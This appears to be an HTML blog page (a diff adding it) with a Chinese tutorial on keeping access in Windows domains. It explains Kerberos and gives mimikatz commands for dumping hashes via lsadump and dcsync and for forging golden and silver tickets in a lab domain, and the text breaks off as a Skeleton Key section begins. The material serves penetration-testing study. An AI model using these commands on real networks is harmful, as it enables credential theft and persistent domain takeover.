@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yuBetter">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://example.com/2024/02/29/权限维持-域环境/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="域控权限维持Kerberos在了解域控权限维持之前得先了解一下Kerberos的认证协议 Kerberos协议认证流程  客户端向AS发起       AS_REQ AS使用客户端的密码hash值进行解密，正确的话就会返回用krbtgt的NTLM Hash加密的TGT票据（其中包含PAC用于验证用户的权限，只有KDC能制作和查看PAC）     AS_REP 客户端用这TGT向TGS发起针对需要访">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持---域环境">
+<meta property="og:url" content="https://example.com/2024/02/29/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9F%9F%E7%8E%AF%E5%A2%83/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="域控权限维持Kerberos在了解域控权限维持之前得先了解一下Kerberos的认证协议 Kerberos协议认证流程  客户端向AS发起       AS_REQ AS使用客户端的密码hash值进行解密，正确的话就会返回用krbtgt的NTLM Hash加密的TGT票据（其中包含PAC用于验证用户的权限，只有KDC能制作和查看PAC）     AS_REP 客户端用这TGT向TGS发起针对需要访">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404104911790.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820170725694.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820170903730.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820171145283.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820172403655.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820172816893.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173653049.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173709928.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173517943.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175005403.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175306893.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175424771.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180005374.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180036419.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180343091.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180608377.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181126557.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181222523.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181252393.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820181928443.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820182046923.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820183251903.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820183310906.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184145688.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184756227.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820184852000.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820185031985.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820185050596.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820204725258.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820204806604.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205114094.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205152872.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205226633.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820205254523.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820210219148.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820213056794.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820215120175.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820214934231.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325162902673.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163104824.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163210977.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325165120864.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821111406479.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821111827314.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325173750046.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325175329381.png">
+<meta property="article:published_time" content="2024-02-29T13:29:30.000Z">
+<meta property="article:modified_time" content="2024-02-29T13:30:39.560Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404104911790.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yubetter.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yubetter.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/yubetter.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            权限维持---域环境 -
+        
+        Yu&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/fonts.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[""]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"好好学习，天天向上","subtitle":{"text":["有远大志向而脚踏实地，有障碍失败而不言放弃","静以修生，俭以养德，非淡泊无以明志，非宁静无以致远","即使慢，驰而不息，纵会落后，纵会失败，但一定可以达到他所向的目标","穷且益坚，不坠青云之志","莫不有始，鲜克有终","靡不有初,鲜克有终"],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/yuBetter","instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"left","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Yu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/CCAF9514AE46A7CD4619E560E0DD2256.jpg" alt="权限维持---域环境" />
+                    <h1 class="article-title-cover">权限维持---域环境</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/yubetter-logon.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">yuBetter</span>
+                            
+                                <span class="author-label"></span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-02-29 21:29:30</span>
+        <span class="mobile">2024-02-29 21:29</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-02-29 21:30:39</span>
+            <span class="mobile">2024-02-29 21:30</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>5.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>19 Mins</span>
+        </span>
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id="域控权限维持"><a href="#域控权限维持" class="headerlink" title="域控权限维持"></a>域控权限维持</h1><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>在了解域控权限维持之前得先了解一下Kerberos的认证协议</p>
+<h3 id="Kerberos协议认证流程"><a href="#Kerberos协议认证流程" class="headerlink" title="Kerberos协议认证流程"></a>Kerberos协议认证流程</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404104911790.png"
+                      alt="image-20230404104911790"
+                ></p>
+<ol>
+<li>客户端向AS发起       AS_REQ</li>
+<li>AS使用客户端的密码hash值进行解密，正确的话就会返回用krbtgt的NTLM Hash加密的TGT票据（其中包含PAC用于验证用户的权限，只有KDC能制作和查看PAC）     AS_REP</li>
+<li>客户端用这TGT向TGS发起针对需要访问服务的TGS_REQ请求      TGS_REQ</li>
+<li>TGS就会使用krbtgt的NTLM Hash对TGT进行解密，正确的话就会返回用服务的NTLM Hash加密的TGS票据（也就是ST），并且带上PAC（再认证过程中，不论用户有没有访问服务的权限，只要TGT正确都会放回ST）    TGS_REP</li>
+<li>客户端利用ST去请求服务      AP_REQ</li>
+<li>服务使用自己的NTLM Hash去解密ST，正确的话就会将其中的PAC给KDC解密，由KDC去判断该用户是否有访问服务的权限（如果没有设置PAC的话就不会去求证KDC，这样就导致了谁都可以去访问这个服务了，这就为了之后的白银票据提供了理论支持）    AP_REP</li>
+</ol>
+<p>至此认证过程就结束了</p>
+<h4 id="记住要点"><a href="#记住要点" class="headerlink" title="记住要点"></a>记住要点</h4><p>kerberos RC4加密的NTLM密码哈希</p>
+<p>（旧版本：DES+RC4；新版本是DES+AES-256）</p>
+<p>登陆票据TGT向DC提供用户身份验证</p>
+<p>Kerberos策略仅在创建TGT时检查</p>
+<p>DC仅在TGT&gt;20分钟时验证用户账户</p>
+<p>ST(TGS)PAC验证时可选的且很少见。这是KDC和应用晨序服务器之间的直接验证检查</p>
+<p>1.服务器LSASS向DC的网络登陆服务（NRPC）发送PAC验证请求</p>
+<p>2.如果它作为服务运行，则PAC验证时可选的（默认禁用）</p>
+<p>3.如果服务作为系统运行，他会在PAC（计算机账户长期密钥）上执行服务器签名验证</p>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>黄金票据的利用过程是在kerberos认证过程第一阶段的AS认证过程中的</p>
+<p>是krbtgt账户的hash签名和加密，使其成为有效的TGT票据</p>
+<p>由于TGT有个特性就是在超过20分钟之前，域控的KDC服务时不会进行用户账户验证的，因此我们甚至可以用已经删除&#x2F;撤销的账户来申请黄金票据</p>
+<p>krbtgt用户散列可以用于模拟任何用户，即使是来自非域计算机的任何权限</p>
+<p>修改密码对本次的攻击没有影响</p>
+<h6 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h6><p>黄金票据的制作需要一些前置条件，需要获取到一些域内信息</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要</span><br><span class="line">域名、域SID、krbtgt哈希值、伪造的用户</span><br></pre></td></tr></table></figure></div>
+
+<p>获取域的sid值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820170725694.png"
+                      alt="image-20230820170725694"
+                ></p>
+<p>查看所处域</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820170903730.png"
+                      alt="image-20230820170903730"
+                ></p>
+<p>获取krbtgt用户的hash</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#mimikatz</span><br><span class="line">privilege::debug   提权</span><br><span class="line">lsadump::lsa /patch   获取krbtgt用户的hash，域的sid值</span><br><span class="line">lsadum::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820171145283.png"
+                      alt="image-20230820171145283"
+                ></p>
+<p>我这边这条指令报错，并且会重启主机，不清楚什么原因</p>
+<p>换另一条指令执行查看所有用户的hash</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:hack-my.com /all /csv</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820172403655.png"
+                      alt="image-20230820172403655"
+                ></p>
+<p>查看到krbtgt的hash值为3240a50b789addc29388d03988e89209</p>
+<p>然后就可以利用得到的信息，利用mimikatz生成黄金票据并且导入（其他域内主机中执行）</p>
+<p>为了演示不受其他条件干扰，我这边先清除一下历史票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::purge</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820172816893.png"
+                      alt="image-20230820172816893"
+                ></p>
+<p>然后生成票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:boy（这个可以随便取） /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /krbtgt:3240a50b789addc29388d03988e89209 /ticket:1.kirbi</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173653049.png"
+                      alt="image-20230820173653049"
+                ></p>
+<p>将票据导入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt 1.kirbi</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173709928.png"
+                      alt="image-20230820173709928"
+                ></p>
+<p>然后就可以连接到域控主机了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\ip\c$</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173517943.png"
+                      alt="image-20230820173517943"
+                ></p>
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>白银票据是利用Kerberos认证的第二阶段TGS生成ST</p>
+<p>他是使用该账户运行的服务的服务账户的NTLM哈希加密和签名生成的</p>
+<p>服务很少去检查PAC（特权属性证书）</p>
+<p>TGS将只允许访问服务本身</p>
+<p>合理的有效时间（电脑账户默认30天）</p>
+<h3 id="常见服务"><a href="#常见服务" class="headerlink" title="常见服务"></a>常见服务</h3><p>CIFS 访问共享文件</p>
+<p>HOST 系统操作（创建计划任务等）</p>
+<p>HIST+RPCSS远程wmic命令执行</p>
+<h4 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">需要条件</span><br><span class="line">1.域名</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM HASH</span><br><span class="line">6.需要伪造的用户名，可以是任意用户名，一般用administrator来</span><br></pre></td></tr></table></figure></div>
+
+<p>获取基本信息的方法和上面的黄金票据的方法差不多</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SID和所处域参考上面</span><br><span class="line">whoami /user </span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">获取服务账号hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175005403.png"
+                      alt="image-20230820175005403"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175306893.png"
+                      alt="image-20230820175306893"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820175424771.png"
+                      alt="image-20230820175424771"
+                ></p>
+<p>所有信息收集之后便就可以制作白银票据了</p>
+<p>清除票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure></div>
+
+<p>使用mimkatz的话就用这条就行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="伪造共享文件夹（cifs）权限实操，（其他域内主机中完成）"><a href="#伪造共享文件夹（cifs）权限实操，（其他域内主机中完成）" class="headerlink" title="伪造共享文件夹（cifs）权限实操，（其他域内主机中完成）"></a>伪造共享文件夹（cifs）权限实操，（其他域内主机中完成）</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:cifs /rc4:a6ab389a705e066e45eedd34e41f6748 /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180005374.png"
+                      alt="image-20230820180005374"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180036419.png"
+                      alt="image-20230820180036419"
+                ></p>
+<h6 id="伪造LDAP服务权限"><a href="#伪造LDAP服务权限" class="headerlink" title="伪造LDAP服务权限"></a>伪造LDAP服务权限</h6><p>制作一个票据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:ldap /rc4:a6ab389a705e066e45eedd34e41f6748 /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">只需要把服务名改成/service:ldap即可</span><br><span class="line"></span><br><span class="line">参考:https://blog.csdn.net/weixin_39851261/article/details/112076055</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180343091.png"
+                      alt="image-20230820180343091"
+                ></p>
+<p>mimikatz</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hack-my.com /domain:hack-my.com /user:krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync 向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。 需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户 只读域控制器默认不允许读取用户密码数据</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820180608377.png"
+                      alt="image-20230820180608377"
+                ></p>
+<p>然后获取到</p>
+<p>krbtgt的hash值就可以进行下一步的操作了</p>
+<p>比如制作黄金票据等</p>
+<h2 id="万能票据"><a href="#万能票据" class="headerlink" title="万能票据"></a>万能票据</h2><p>万能密钥是一种持久性的技术，它可以修补域控（lsass进程），使其允许任何用户使用单一没密码进行访问</p>
+<p>该攻击是由Dell Secureworks发现的，该软件用户名为Skeleton Key恶意软件中</p>
+<p>在域控中安装这个东西之后所有的账户都可以使用同一个密码，同时原有的密码依旧有效，但是重启域控之后就会失效</p>
+<h6 id="1-常规利用"><a href="#1-常规利用" class="headerlink" title="1.常规利用"></a>1.常规利用</h6><p>通过mimikatz执行</p>
